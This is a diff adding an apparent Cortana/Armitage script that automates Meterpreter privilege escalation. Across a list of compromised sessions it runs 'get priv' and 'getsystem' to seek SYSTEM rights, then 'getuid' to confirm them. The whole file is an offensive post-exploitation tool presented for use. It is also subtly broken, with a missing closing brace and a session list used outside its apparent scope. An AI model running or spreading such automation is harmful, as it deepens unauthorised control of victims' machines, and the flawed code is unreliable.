@@ -1,0 +1,31 @@
+command arguments {
+   @sessions = split(',', $1);
+   fire_event_local("elevatePrivileges", @sessions)
+}
+
+on elevatePrivileges {
+   local('$console $session');
+   $console = console();
+
+   foreach $session (@sessions) {
+      m_cmd($session, "get priv");
+      sleep(1000);
+      m_cmd($session, "getsystem");
+      sleep(3000);
+   }
+   fire_event_local("checkNewPrivileges", @sessions);
+}
+
+on checkNewPrivileges {
+   local('$console $session');
+   $console = console();
+
+   foreach $session (@sessions) {
+      m_cmd($session, "getuid");
+      sleep(2000);
+   }
+   quit();
+
+on meterpreter_getuid {
+   println("$1, $2 -> $3");
+}
